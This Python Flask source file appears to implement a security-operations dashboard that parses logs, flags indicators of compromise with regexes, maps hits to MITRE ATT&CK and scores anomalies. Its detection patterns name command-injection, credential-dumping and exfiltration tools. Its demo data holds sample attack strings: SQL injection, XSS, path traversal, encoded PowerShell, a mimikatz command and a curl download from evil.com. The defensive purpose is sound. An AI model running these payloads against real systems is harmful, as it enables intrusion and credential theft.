
from flask import Flask, request, jsonify, send_file, Response
import re, os, hashlib, json, random, datetime, threading
from collections import Counter, defaultdict
from io import BytesIO

app = Flask(__name__)

try:
    from sklearn.ensemble import IsolationForest
    import numpy as np; ML_OK = True
except ImportError:
    ML_OK = False

try:
    from reportlab.lib.pagesizes import A4
    from reportlab.lib.styles import getSampleStyleSheet
    from reportlab.lib import colors as rl_colors
    from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle, HRFlowable
    from reportlab.lib.units import cm; PDF_OK = True
except ImportError:
    PDF_OK = False

_state = {"logs": [], "custody": {}, "cases": []}
_lock  = threading.Lock()

MITRE_MAP = {
    "brute_force":         ("T1110",     "Brute Force",               "Credential Access"),
    "credential_stuffing": ("T1110.004", "Credential Stuffing",       "Credential Access"),
    "priv_esc":            ("T1068",     "Exploit for Priv Esc",      "Privilege Escalation"),
    "persistence":         ("T1547",     "Boot/Logon Autostart",      "Persistence"),
    "sqli":                ("T1190",     "Exploit Public-Facing App", "Initial Access"),
    "xss":                 ("T1059.007", "JavaScript Injection",      "Execution"),
    "path_traversal":      ("T1083",     "File & Dir Discovery",      "Discovery"),
    "cmd_injection":       ("T1059",     "Command & Scripting",       "Execution"),
    "port_scan":           ("T1046",     "Network Svc Discovery",     "Discovery"),
    "data_exfil":          ("T1041",     "Exfiltration Over C2",      "Exfiltration"),
    "mimikatz":            ("T1003",     "OS Credential Dumping",     "Credential Access"),
    "lateral_move":        ("T1021",     "Remote Services",           "Lateral Movement"),
}

IOC_PATTERNS = {
    "SQL Injection":  (re.compile(r"(UNION\s+SELECT|SELECT.+FROM|DROP\s+TABLE|'--|\bOR\s+1=1)", re.I), "CRITICAL", "sqli"),
    "XSS Payload":   (re.compile(r"(<script|javascript:|onerror=|onload=|alert\()", re.I),            "HIGH",     "xss"),
    "Path Traversal": (re.compile(r"(\.\./|\.\.\\|%2e%2e)", re.I),                                    "HIGH",     "path_traversal"),
    "Cmd Injection":  (re.compile(r"(;ls|;cat|;id|cmd\.exe|powershell\s+-enc|\|nc\s)", re.I),         "CRITICAL", "cmd_injection"),
    "Mimikatz":       (re.compile(r"(mimikatz|sekurlsa|lsadump)", re.I),                               "CRITICAL", "mimikatz"),
    "Encoded PS":     (re.compile(r"powershell\s+-[Ee]nc", re.I),                                     "HIGH",     "cmd_injection"),
    "Port Scan":      (re.compile(r"(nmap|masscan|SYN\s+SCAN)", re.I),                                "MEDIUM",   "port_scan"),
    "Data Exfil":     (re.compile(r"(base64|b64decode|exfil|wget\s|curl\s.+-o)", re.I),               "HIGH",     "data_exfil"),
}

KNOWN_BAD_IPS = {
    "185.220.101.45": "Tor Exit Node — RU",
    "45.142.212.100": "Brute Force — CN",
    "194.165.16.77":  "C2 Server — UA",
    "91.219.28.10":   "Botnet — RO",
    "103.75.190.100": "Scanner — HK",
}

WIN_EVENT_MAP = {
    "4625": ("FAILED",  "Windows Failed Logon",      "brute_force"),
    "4624": ("SUCCESS", "Windows Successful Logon",  None),
    "4648": ("WARN",    "Logon with Explicit Creds", "credential_stuffing"),
    "4720": ("WARN",    "User Account Created",       "persistence"),
    "4732": ("WARN",    "User Added to Admin Group", "priv_esc"),
    "4688": ("INFO",    "Process Created",            None),
    "4698": ("WARN",    "Scheduled Task Created",    "persistence"),
    "7045": ("WARN",    "New Service Installed",     "persistence"),
}

def sha256(path):
    h = hashlib.sha256()
    try:
        with open(path, "rb") as f:
            for chunk in iter(lambda: f.read(65536), b""): h.update(chunk)
        return h.hexdigest()
    except: return "N/A"

def ioc_scan(raw):
    return [(n, s, mk) for n, (pat, s, mk) in IOC_PATTERNS.items() if pat.search(raw)]

def calc_sev(log, ip_counts):
    if log.get("ioc_hits"):
        order = ["CRITICAL","HIGH","MEDIUM","LOW"]
        idx = min((order.index(h[1]) for h in log["ioc_hits"] if h[1] in order), default=3)
        return order[idx]
    c = ip_counts.get(log["ip"], 0)
    if log["status"] == "FAILED":
        if c >= 20: return "CRITICAL"
        if c >= 10: return "HIGH"
        if c >= 3:  return "MEDIUM"
        return "LOW"
    return "INFO"

def parse_generic(line):
    m = re.search(r"(?P<ip>\d{1,3}(?:\.\d{1,3}){3})", line)
    if not m: return None
    ts_m = re.search(r"\[(\d{2}/\w+/\d{4}:\d{2}:\d{2}:\d{2})", line)
    t = datetime.datetime.now()
    if ts_m:
        try: t = datetime.datetime.strptime(ts_m.group(1), "%d/%b/%Y:%H:%M:%S")
        except: pass
    um = re.search(r'user[=\s:"]+(\w+)', line, re.I)
    return {"time": t, "user": um.group(1) if um else "unknown",
            "ip": m.group("ip"),
            "status": "FAILED" if re.search(r"(fail|invalid|denied|error|refused)", line, re.I) else "SUCCESS",
            "raw": line.strip(), "event_id": None}

def parse_winevent(line):
    em = re.search(r"EventID[=:\s]+(\d{4})", line, re.I)
    if not em: return None
    eid = em.group(1); info = WIN_EVENT_MAP.get(eid)
    if not info: return None
    status, desc, mk = info
    im = re.search(r"(\d{1,3}(?:\.\d{1,3}){3})", line)
    um = re.search(r"(Account Name|User)[=:\s]+(\w+)", line, re.I)
    tm = re.search(r"(\d{4}-\d{2}-\d{2}\s+\d{2}:\d{2}:\d{2})", line)
    t  = datetime.datetime.now()
    if tm:
        try: t = datetime.datetime.strptime(tm.group(1), "%Y-%m-%d %H:%M:%S")
        except: pass
    return {"time": t, "user": um.group(2) if um else "SYSTEM",
            "ip": im.group(1) if im else "0.0.0.0", "status": status,
            "raw": line.strip(), "event_id": eid, "win_desc": desc}

def parse_file(path):
    logs = []; ts = datetime.datetime.now()
    custody = {
        "kanit_id": f"EV-{ts.strftime('%Y%m%d-%H%M%S')}",
        "dosya_adi": os.path.basename(path),
        "sha256": sha256(path),
        "boyut": f"{os.path.getsize(path):,} byte",
        "yuklenme": ts.strftime("%Y-%m-%d %H:%M:%S"),
        "analist": os.environ.get("USER", "SOC_Analisti"),
    }
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                if not line.strip(): continue
                e = parse_winevent(line) if re.search(r"EventID", line, re.I) else None
                if not e: e = parse_generic(line)
                if e: e["ioc_hits"] = ioc_scan(line); logs.append(e)
    except: pass
    ipc = Counter(r["ip"] for r in logs if r["status"] == "FAILED")
    for r in logs: r["severity"] = calc_sev(r, ipc)
    custody["toplam"] = len(logs)
    custody["ms"] = int((datetime.datetime.now() - ts).total_seconds() * 1000)
    return logs, custody

def gen_demo(n=400):
    ips   = ["192.168.1.100","45.142.212.100","185.220.101.45","10.0.0.55",
             "194.165.16.77","172.16.4.22","91.219.28.10","10.10.10.5","203.0.113.77"]
    users = ["admin","root","john.doe","service_acc","SYSTEM","guest","backup_usr","svc_sql"]
    attacks = [
        "GET /admin HTTP/1.1 401",
        "POST /login?user=admin&pass=admin HTTP/1.1 403",
        "GET /../../../etc/passwd HTTP/1.1 400",
        "POST /search?q=1'+UNION+SELECT+null-- HTTP/1.1 500",
        "GET /<script>alert(1)</script> HTTP/1.1 400",
        "EventID=4625 Account Name=administrator Source=45.142.212.100",
        "EventID=4624 Account Name=john.doe Source=10.0.0.55",
        "EventID=4732 Account Name=hacker Group=Administrators",
        "Failed password for invalid user root from 91.219.28.10 port 22",
        "cmd.exe /c powershell -enc dGhpcyBpcyBldmlsIGNvZGU=",
        "mimikatz sekurlsa::logonpasswords detected",
        "nmap -sS -T4 192.168.1.0/24 scan detected",
        "curl -o /tmp/shell.sh http://evil.com/payload",
        "Accepted publickey for svc_account from 10.0.0.55",
        "GET /wp-admin/install.php HTTP/1.1 200",
    ]
    base = datetime.datetime.now() - datetime.timedelta(hours=24)
    logs = []
    for _ in range(n):
        raw = random.choice(attacks); ip = random.choice(ips)
        t   = base + datetime.timedelta(seconds=random.randint(0, 86400))
        status = "FAILED" if re.search(r"(fail|401|403|400|4625|invalid|denied)", raw, re.I) else "SUCCESS"
        logs.append({"time": t, "user": random.choice(users), "ip": ip, "status": status,
                     "raw": raw, "event_id": None, "ioc_hits": ioc_scan(raw)})
    logs.sort(key=lambda x: x["time"])
    ipc = Counter(r["ip"] for r in logs if r["status"] == "FAILED")
    for r in logs: r["severity"] = calc_sev(r, ipc)
    custody = {"kanit_id": "EV-DEMO", "dosya_adi": "demo_simulation.log",
               "sha256": "demo-data", "boyut": "sentetik",
               "yuklenme": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
               "analist": "DEMO", "toplam": n, "ms": 0}
    return logs, custody

def correlate(logs):
    ip_tl = defaultdict(list)
    for r in sorted(logs, key=lambda x: x["time"]): ip_tl[r["ip"]].append(r)
    cases = []
    for ip, evs in ip_tl.items():
        if ip in ("N/A", "0.0.0.0"): continue
        failed  = [e for e in evs if e["status"] == "FAILED"]
        success = [e for e in evs if e["status"] == "SUCCESS"]
        flags = []; mkeys = []
        if len(failed) >= 5 and success:
            last_f = failed[-1]["time"]
            if [s for s in success if s["time"] > last_f]:
                flags.append("Brute Force → Hesap Ele Geçirme"); mkeys += ["brute_force"]
        for e in evs:
            for hit in e.get("ioc_hits", []):
                if hit[2] and hit[2] not in mkeys:
                    mkeys.append(hit[2]); flags.append(f"{hit[0]} tespit edildi")
        if ip in KNOWN_BAD_IPS: flags.append(f"Karalistede: {KNOWN_BAD_IPS[ip]}")
        if flags:
            sev = "CRITICAL" if len(failed) >= 10 else "HIGH" if any("Karalist" in f for f in flags) else "MEDIUM"
            cases.append({"ip": ip, "chain": flags, "mitre_keys": list(set(mkeys)),
                          "severity": sev, "event_count": len(evs), "failed_count": len(failed),
                          "first_seen": evs[0]["time"].strftime("%H:%M"),
                          "last_seen": evs[-1]["time"].strftime("%H:%M")})
    return sorted(cases, key=lambda x: ("CRITICAL","HIGH","MEDIUM","LOW").index(x["severity"]))

def serialize_logs(logs, limit=200):
    out = []
    for r in logs[:limit]:
        mid = ""
        for hit in r.get("ioc_hits", []):
            if hit[2] and hit[2] in MITRE_MAP: mid = MITRE_MAP[hit[2]][0]; break
        out.append({
            "time":     r["time"].strftime("%H:%M:%S"),
            "ip":       r["ip"],
            "user":     r["user"],
            "status":   r["status"],
            "severity": r.get("severity", "INFO"),
            "mitre":    mid,
            "raw":      r["raw"][:120],
            "ioc":      [h[0] for h in r.get("ioc_hits", [])],
        })
    return out

def build_stats(logs, cases):
    if not logs:
        return {"total":0,"critical":0,"high":0,"medium":0,"low":0,"info":0,
                "ioc":0,"failed":0,"cases":0,"hourly":[],"sev_dist":{},
                "top_ips":[],"top_iocs":[],"mitre_hits":[],"bad_ips":[]}
    sev_c   = Counter(r.get("severity","INFO") for r in logs)
    ioc_c   = Counter()
    mitre_c = Counter()
    for r in logs:
        for h in r.get("ioc_hits",[]): ioc_c[h[0]] += 1
        for h in r.get("ioc_hits",[]):
            if h[2]: mitre_c[h[2]] += 1
    for c in cases:
        for mk in c.get("mitre_keys",[]): mitre_c[mk] += 1

    hourly = []
    hour_c  = Counter(r["time"].hour for r in logs)
    fail_c  = Counter(r["time"].hour for r in logs if r["status"]=="FAILED")
    for h in range(24):
        hourly.append({"hour": h, "total": hour_c.get(h,0), "failed": fail_c.get(h,0)})

    top_ips = []
    for ip, cnt in Counter(r["ip"] for r in logs if r["status"]=="FAILED").most_common(8):
        top_ips.append({"ip": ip, "count": cnt, "malicious": ip in KNOWN_BAD_IPS,
                        "info": KNOWN_BAD_IPS.get(ip, "")})

    seen_ips = set(r["ip"] for r in logs)
    bad_ips  = [{"ip": ip, "info": KNOWN_BAD_IPS[ip],
                 "count": sum(1 for r in logs if r["ip"]==ip)}
                for ip in seen_ips if ip in KNOWN_BAD_IPS]

    mitre_hits = []
    for mk, cnt in mitre_c.most_common(10):
        if mk in MITRE_MAP:
            tid, tn, tc = MITRE_MAP[mk]
            mitre_hits.append({"id": tid, "name": tn, "tactic": tc, "count": cnt})

    return {
        "total":    len(logs),
        "critical": sev_c.get("CRITICAL",0),
        "high":     sev_c.get("HIGH",0),
        "medium":   sev_c.get("MEDIUM",0),
        "low":      sev_c.get("LOW",0),
        "info":     sev_c.get("INFO",0),
        "ioc":      sum(1 for r in logs if r.get("ioc_hits")),
        "failed":   sum(1 for r in logs if r["status"]=="FAILED"),
        "cases":    len(cases),
        "hourly":   hourly,
        "sev_dist": dict(sev_c),
        "top_ips":  top_ips,
        "top_iocs": [{"name": k, "count": v} for k,v in ioc_c.most_common(8)],
        "mitre_hits": mitre_hits,
        "bad_ips":  bad_ips,
    }

@app.route("/")
def index():
    html_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "index.html")
    if not os.path.exists(html_path):
        html_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "templates", "index.html")
    with open(html_path, "r", encoding="utf-8") as f:
        from flask import Response
        return Response(f.read(), mimetype="text/html")

@app.route("/api/demo", methods=["POST"])
def api_demo():
    logs, custody = gen_demo(400)
    cases = correlate(logs)
    with _lock:
        _state["logs"]    = logs
        _state["custody"] = custody
        _state["cases"]   = cases
    return jsonify({"ok": True, "count": len(logs)})

@app.route("/api/upload", methods=["POST"])
def api_upload():
    f = request.files.get("file")
    if not f: return jsonify({"ok": False, "error": "Dosya bulunamadı"}), 400
    tmp = f"/tmp/aegis_upload_{datetime.datetime.now().strftime('%H%M%S')}.log"
    f.save(tmp)
    logs, custody = parse_file(tmp)
    cases = correlate(logs)
    with _lock:
        _state["logs"]    = logs
        _state["custody"] = custody
        _state["cases"]   = cases
    try: os.remove(tmp)
    except: pass
    return jsonify({"ok": True, "count": len(logs)})

@app.route("/api/stats")
def api_stats():
    with _lock:
        logs  = _state["logs"]
        cases = _state["cases"]
    return jsonify(build_stats(logs, cases))

@app.route("/api/logs")
def api_logs():
    sev    = request.args.get("sev", "")
    search = request.args.get("q",   "").lower()
    page   = int(request.args.get("page", 1))
    per    = int(request.args.get("per",  80))
    with _lock: logs = list(_state["logs"])
    logs = sorted(logs, key=lambda x: x["time"], reverse=True)
    if sev:    logs = [r for r in logs if r.get("severity") == sev]
    if search: logs = [r for r in logs if search in r["raw"].lower() or search in r["ip"]]
    total = len(logs)
    start = (page-1)*per; end = start+per
    return jsonify({"total": total, "page": page, "logs": serialize_logs(logs[start:end], per)})

@app.route("/api/cases")
def api_cases():
    with _lock: cases = _state["cases"]
    out = []
    for c in cases:
        mitre = []
        for mk in c.get("mitre_keys", []):
            if mk in MITRE_MAP:
                tid, tn, tc = MITRE_MAP[mk]
                mitre.append({"id": tid, "name": tn, "tactic": tc})
        out.append({**c, "mitre_detail": mitre})
    return jsonify(out)

@app.route("/api/custody")
def api_custody():
    with _lock: return jsonify(_state["custody"])

@app.route("/api/ai")
def api_ai():
    if not ML_OK: return jsonify({"ok": False, "error": "scikit-learn yüklü değil"})
    with _lock: logs = list(_state["logs"])
    if len(logs) < 20: return jsonify({"ok": False, "error": "Yetersiz veri (min 20 kayıt)"})
    X = np.array([[r["time"].hour, 1 if r["status"]=="FAILED" else 0,
                   len(r.get("ioc_hits",[]))] for r in logs])
    preds = IsolationForest(contamination=0.05, random_state=42).fit_predict(X)
    anomalies = [r for p,r in zip(preds,logs) if p==-1]
    return jsonify({"ok": True, "count": len(anomalies),
                    "logs": serialize_logs(sorted(anomalies, key=lambda x: x["time"], reverse=True), 50)})

@app.route("/api/ueba")
def api_ueba():
    with _lock: logs = list(_state["logs"])
    uh = defaultdict(list); ui = defaultdict(set); uf = defaultdict(int)
    for r in logs:
        uh[r["user"]].append(r["time"].hour)
        ui[r["user"]].add(r["ip"])
        if r["status"]=="FAILED": uf[r["user"]] += 1
    results = []
    for u in set(list(uh.keys())+list(ui.keys())+list(uf.keys())):
        hrs = uh[u]; ips = ui[u]; fails = uf[u]
        night = sum(1 for h in hrs if h>=23 or h<=5)
        night_pct = round(night/len(hrs)*100) if hrs else 0
        multi_ip = len(ips) > 3
        sev = "INFO"
        if night_pct > 50 or fails >= 20: sev = "CRITICAL"
        elif night_pct > 20 or fails >= 10 or multi_ip: sev = "HIGH"
        elif night_pct > 0 or fails >= 5: sev = "MEDIUM"
        results.append({"user": u, "events": len(hrs), "fails": fails,
                        "unique_ips": len(ips), "night_pct": night_pct,
                        "multi_ip": multi_ip, "severity": sev})
    results.sort(key=lambda x: ("CRITICAL","HIGH","MEDIUM","LOW","INFO").index(x["severity"]))
    return jsonify(results)

if __name__ == "__main__":
    print("\n" + "="*55)
    print("  AEGIS SOC v4.0  —  Web Arayüzü Başlatılıyor")
    print("  Tarayıcı: http://localhost:5050")
    print("="*55 + "\n")
    app.run(debug=True, host="127.0.0.1", port=5050)
